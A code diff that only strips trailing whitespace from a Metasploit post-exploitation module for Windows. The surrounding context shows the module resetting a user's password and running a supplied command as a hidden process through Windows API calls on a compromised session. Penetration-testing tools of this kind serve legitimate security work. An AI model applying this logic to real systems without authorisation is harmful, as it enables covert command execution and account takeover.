@@ -23,8 +23,8 @@ class Metasploit3 < Msf::Post
 			'Name'                 => "Windows Manage Run Command As User",
 			'Description'          => %q{
 				This module will login with the specified username/password and execute the
-				supplied command as a hidden process. Output is not returned by default, by setting 
-				CMDOUT to false output will be redirected to a temp file and read back in to 
+				supplied command as a hidden process. Output is not returned by default, by setting
+				CMDOUT to false output will be redirected to a temp file and read back in to
 				display.By setting advanced option SETPASS to true, it will reset the users
 				password and then execute the command.
 				},
@@ -60,7 +60,7 @@ class Metasploit3 < Msf::Post
 				@isadmin = false
 				return true
 			else
-				return false 
+				return false
 			end
 		elsif is_admin?
 			@isadmin = true
@@ -80,9 +80,9 @@ class Metasploit3 < Msf::Post
 				break if d == ""
 			end
 			r.channel.close
-			return true if tmpout.include?("successfully") 
+			return true if tmpout.include?("successfully")
 			return false
-		rescue 
+		rescue
 			return false
 		end
 	end
@@ -105,9 +105,9 @@ class Metasploit3 < Msf::Post
 		rg_adv = session.railgun.advapi32
 
 		# reset user pass if setpass is true
-		if datastore["SETPASS"] 
+		if datastore["SETPASS"]
 			print_status("Setting user password")
-			if !reset_pass(user,pass) 
+			if !reset_pass(user,pass)
 				print_error("Error resetting password")
 				return 0
 			end
@@ -123,7 +123,7 @@ class Metasploit3 < Msf::Post
 
 		# this is start info struct for a hidden process last two params are std out and in.
 		#for hidden startinfo[12] = 1 = STARTF_USESHOWWINDOW and startinfo[13] = 0 = SW_HIDE
-		startinfo = [0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0] 
+		startinfo = [0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0]
 		startinfo = startinfo.pack("LLLLLLLLLLLLSSLLLL")
 
 		#set command string based on cmdout vars
@@ -133,7 +133,7 @@ class Metasploit3 < Msf::Post
 		# if local admin use createprocesswithlogon, if system logonuser and createprocessasuser
 		# execute command and get output with a poor mans pipe
 			
-		if priv_check 
+		if priv_check
 			if @isadmin #local admin
 				print_status("Executing CreateProcessWithLogonW...we are Admin")
 				cs = rg_adv.CreateProcessWithLogonW(user,nil,pass,"LOGON_WITH_PROFILE",nil, cmdstr,
@@ -149,7 +149,7 @@ class Metasploit3 < Msf::Post
 			print_error("Insuficient Privileges, either you are not Admin or system or you elevated")
 			print_error("privs to system and do not have sufficent Priveldges. If you elevated to")
 			print_error("system, migrate to a process that was started as system (srvhost.exe)")
-			return 0 
+			return 0
 		end
 
 		# Only process file if the process creation was successful, delete when done, give us info
